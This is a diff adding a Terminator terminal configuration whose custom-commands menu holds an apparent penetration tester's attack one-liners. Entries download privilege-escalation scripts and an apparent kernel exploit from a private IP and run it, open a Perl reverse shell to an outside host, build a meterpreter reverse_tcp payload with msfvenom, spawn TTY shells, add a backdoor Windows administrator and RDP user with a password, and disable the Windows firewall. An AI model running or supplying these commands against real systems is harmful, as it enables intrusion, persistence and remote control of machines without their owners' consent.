@@ -1,0 +1,113 @@
+[global_config]
+  enabled_plugins = CustomCommandsMenu, LaunchpadCodeURLHandler, APTURLHandler, LaunchpadBugURLHandler
+  suppress_multiple_term_dialog = True
+  title_inactive_bg_color = "#000000"
+  title_inactive_fg_color = "#3465a4"
+  title_transmit_bg_color = "#000000"
+  title_transmit_fg_color = "#8ae234"
+[keybindings]
+[layouts]
+  [[default]]
+    [[[child1]]]
+      parent = window0
+      type = Terminal
+    [[[window0]]]
+      parent = ""
+      type = Window
+[plugins]
+  [[CustomCommandsMenu]]
+    [[[LinEnum]]]
+      command = wget http://192.168.21.31/NIX/LinEnum.sh
+      enabled = True
+      name = LinEnum
+      position = 16
+    [[[TTI-lua]]]
+      command = lua: os.execute('/bin/sh')
+      enabled = True
+      name = TTI-lua
+      position = 5
+    [[[TTI-perl1]]]
+      command = '''perl —e 'exec "/bin/sh";''''
+      enabled = True
+      name = TTI-perl1
+      position = 2
+    [[[TTI-perl2]]]
+      command = perl: exec "/bin/sh";
+      enabled = True
+      name = TTI-perl2
+      position = 3
+    [[[TTI-python]]]
+      command = '''python -c 'import pty; pty.spawn("/bin/sh")'
+echo os.system('/bin/bash')'''
+      enabled = True
+      name = TTI-python
+      position = 0
+    [[[TTI-ruby]]]
+      command = 'ruby: exec "/bin/sh"'
+      enabled = True
+      name = TTI-ruby
+      position = 4
+    [[[TTI-sh]]]
+      command = /bin/sh -i
+      enabled = True
+      name = TTI-sh
+      position = 1
+    [[[dirty32]]]
+      command = cd /tmp ; wget http://192.16821.31/NIX/dirty32 ; chmod +x dirty32 ; ./dirty32 && rm dirty32
+      enabled = True
+      name = dirty32
+      position = 6
+    [[[msfvenom-win-stageless]]]
+      command = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.16821.31 LPORT=4545 -f exe > shell.exe "
+      enabled = True
+      name = msfvenom-win-stageless
+      position = 7
+    [[[net add admin]]]
+      command = net localgroup administrators delta /add
+      enabled = True
+      name = net add admin
+      position = 12
+    [[[net add rdp]]]
+      command = net localgroup "Remote Desktop Users" delta /add
+      enabled = True
+      name = net add rdp
+      position = 13
+    [[[net user add]]]
+      command = net user /add delta korg45moffel
+      enabled = True
+      name = net user add
+      position = 11
+    [[[perl rev 443]]]
+      command = '''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.16821.31:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''''
+      enabled = True
+      name = perl rev 443
+      position = 9
+    [[[privchecker]]]
+      command = wget http://192.168.21.31/NIX/linuxprivchecker.py
+      enabled = True
+      name = privchecker
+      position = 15
+    [[[shell-upgrade]]]
+      command = export TERM=linux ; export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+      enabled = True
+      name = shell-upgrade
+      position = 17
+    [[[tar folder]]]
+      command = tar czf archive.tar.gz
+      enabled = True
+      name = tar folder
+      position = 10
+    [[[win-firewall-off]]]
+      command = netsh firewall set opmode disable
+      enabled = True
+      name = win-firewall-off
+      position = 14
+    [[[win-gcc]]]
+      command = "i686-w64-mingw32-gcc -o winexploit "
+      enabled = True
+      name = win-gcc
+      position = 8
+[profiles]
+  [[default]]
+    cursor_color = "#aaaaaa"
+    foreground_color = "#00ff00"
